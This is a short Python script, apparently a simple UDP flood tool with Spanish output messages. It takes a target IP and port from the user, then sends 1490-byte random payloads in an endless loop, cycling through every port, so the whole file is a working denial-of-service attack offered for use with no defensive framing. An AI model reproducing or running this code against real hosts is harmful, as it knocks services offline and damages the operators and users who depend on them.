import sys
import os
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


ip = input("IP Target: ")
port = int(input("Port:"))

sent = 0
while True:
    sock.sendto(bytes,(ip,port))
    sent = sent + 1
    port = port + 1
    print(f"Enviados {sent} packetes a {ip} en el puerto {port}")
    if port == 65534:
        port = 1